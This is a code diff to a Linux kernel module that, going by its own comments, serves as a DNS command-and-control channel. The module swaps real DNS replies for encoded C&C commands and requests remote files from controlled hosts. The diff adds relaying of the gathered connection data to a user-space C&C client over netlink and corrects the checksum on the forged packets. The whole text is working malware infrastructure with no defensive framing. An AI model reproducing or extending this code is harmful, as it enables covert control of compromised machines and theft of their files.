@@ -97,6 +97,9 @@ struct conn_in_data{
 
 struct conn_in_data conn_in_list;
 
+/* Ugly hack. This netlink pid should be assigned to conn_id_data */
+static u32 netlink_pid;
+
 /* Netlink socket for communication between this module and the user space C&C client */
 
 struct sock *nl_sk = NULL;
@@ -115,13 +118,13 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 				unsigned char* enc_command;
 			        uint16_t rf_len = 0;
 				int len = 0;
+				/* save netlink pid */
+				netlink_pid = nlh->nlmsg_pid;
 				get_file_msg* gfmsg = msg->data;
 				rf_len = strlen((const char*)gfmsg->remote_file)+1;
 				printk(KERN_INFO"remote file length %d",rf_len);
 				enc_command = (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+256),GFP_DMA);
-				//			command ;
 				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
-//				strcat(command,"get";
 				strcat(command,gfmsg->remote_file);
 				printk(KERN_INFO"Command %s",command);
 				len = modp_b64w_encode(enc_command,command,rf_len+3);
@@ -191,9 +194,25 @@ uint32_t remove_connection(uint32_t ip_addr){
 	ret = 0;
 	list_for_each_entry_safe(c,temp,&conn_in_list.list,list){
 		if(c->ip_addr == ip_addr){
+			struct nlmsg_hdr *nlh_new;
+                        int msg_size = strlen((const char*)c->buff);
+                        int res;
 			ret = c->connection_id;
-			printk(KERN_DEBUG "[DNSCC] Match found, removing %u connection from list!", ret);
+			printk(KERN_INFO "[DNSCC] Match found, removing %u connection from list!", ret);
 			printk(KERN_INFO "[DNSCC] Connection data is \n  %s",c->buff);
+			struct sk_buff *skb_out;
+                        skb_out = nlmsg_new(msg_size,0);
+                        if(!skb_out){
+                                printk(KERN_INFO"[DNSCC] Failed to allocate skb_out");
+                        }
+                        nlh_new = nlmsg_put(skb_out,0,0,NLMSG_DONE,msg_size,0);
+                        NETLINK_CB(skb_out).dst_group = 0;
+                        memcpy(nlmsg_data(nlh_new),c->buff,msg_size);
+                        res = nlmsg_unicast(nl_sk,skb_out,netlink_pid);
+                        if(res < 0) {
+                                printk(KERN_INFO "[DNSCC] Failed to send back nl message");
+                        }
+                        printk(KERN_INFO"[DNSCC] Netlink message sent \n");			
 			list_del(&c->list);
 			kfree(c);
 		}
@@ -653,6 +672,7 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			uint16_t payload_len = ntohs(udph->len) - UDP_HDR_LEN;
 			int offset;
 			int len;
+                        unsigned int udplen;
 			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			command = get_command(iph->daddr);
 			new_dns_size = sizeof(unsigned char)*payload_len + strlen((const char*)command+20) ;
@@ -674,8 +694,8 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	                ip_send_check (iph);
 			udph->check = 0;
 	               	offset = skb_transport_offset(skb);
-	                len = skb->len - offset;
-	                udph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_UDP, 0);
+			udplen = skb->len - (iph->ihl<<2);
+                        udph->check = csum_tcpudp_magic((iph->saddr), (iph->daddr), udplen, iph->protocol, csum_partial((char*)udph, udplen,0));
 			/* remove the command */
 			remove_command(iph->daddr);
 		}
